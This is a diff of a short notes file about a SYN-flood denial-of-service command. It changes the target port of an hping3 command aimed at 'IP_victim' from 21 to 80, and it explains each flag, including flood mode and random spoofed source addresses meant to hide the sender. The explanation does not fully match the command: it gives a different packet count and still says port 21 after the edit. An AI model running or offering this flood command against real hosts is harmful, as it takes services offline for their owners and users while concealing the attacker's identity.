@@ -1,11 +1,11 @@
-hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source IP_victim
+hping3 -c 10000 -d 120 -S -w 64 -p 80 --flood --rand-source IP_victim
 
 
     -c 100000 = Number of packets to send.
     -d 120 = Size of each packet that was sent to target machine.
     -S = I am sending SYN packets only.
     -w 64 = TCP window size.
-    -p 21 = Destination port (21 being FTP port). You can use any port here.
+    -p 21 = Destination port . You can use any port here.
     --flood = Sending packets as fast as possible, without taking care to show incoming replies. Flood mode.
     --rand-source = Using Random Source IP Addresses. You can also use -a or –spoof to hide hostnames.
 
